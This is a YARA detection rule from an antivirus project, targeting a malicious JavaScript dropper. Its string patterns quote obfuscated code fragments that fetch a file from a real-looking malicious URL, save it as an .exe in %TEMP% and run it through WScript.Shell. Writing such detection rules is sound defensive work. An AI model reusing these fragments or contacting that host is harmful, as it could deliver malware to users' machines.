rule sig_20160328_43db54974c44bd23248f5e846739ab7f {
  meta:
    description = "datamaliciousorder - file 20160328_43db54974c44bd23248f5e846739ab7f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1235bc17dfee19cf916d7e77562813e136863cef2d2754991a29391d147d7fbf"

  strings:
    $s1  = "function Tcbsy() {return Spvkfs[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bP3iNNYKyquIIN.exe\";};" fullword ascii
    $s2  = "Hxhdptm[Sloweike](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "var Spvkfs = function Aailogz() {return WScript[Vcqgbzbza](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Ihyodbir](Idsuhkdcpy() * 11)} while (Hxhdptm[\"readystate\"] < 4 );" fullword ascii
    $s5  = "function Vljzecwoet(Kfhjxocvj, Rznvgalvg){return Kfhjxocvj - Rznvgalvg;};" fullword ascii
    $s6  = "function Onjqleka(Pdhdtfxcs){Spvkfs[\"Run\"](Pdhdtfxcs, Kwpmelj, Kwpmelj);};" fullword ascii
    $s7  = "function Ipmzt() {return ((Qowwggp == true) && (Qowwggp == Cxuxzgl)) ? 1 : Kwpmelj;};" fullword ascii
    $s8  = "function Vkwsqzvslw(){return Vcqgbzbza;};" fullword ascii
    $s9  = "function Xhbegkzz(){return Xhwrtoodk;};" fullword ascii
    $s10 = " while (Abtljfams){" fullword ascii
    $s11 = "var Gldfirgvms = false;" fullword ascii
    $s12 = "function Idsuhkdcpy(){return 22;};" fullword ascii
    $s13 = "function Wcrcnftlpx(Otnxsnr) {var Bdgeabtkx = (1, 2, 3, 4, 5, Otnxsnr); return Bdgeabtkx;};" fullword ascii
    $s14 = "var Gmbcb = new this[\"Date\"]();" fullword ascii
    $s15 = "Cxuxzgl = true; " fullword ascii
    $s16 = "function Yvrsztrn()" fullword ascii
    $s17 = "var Qowwggp = false;" fullword ascii
    $s18 = "var Cxuxzgl = false;" fullword ascii
    $s19 = "Qowwggp = true; " fullword ascii
    $s20 = "return Vljzecwoet(Hnozo, Fknlkvhm);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}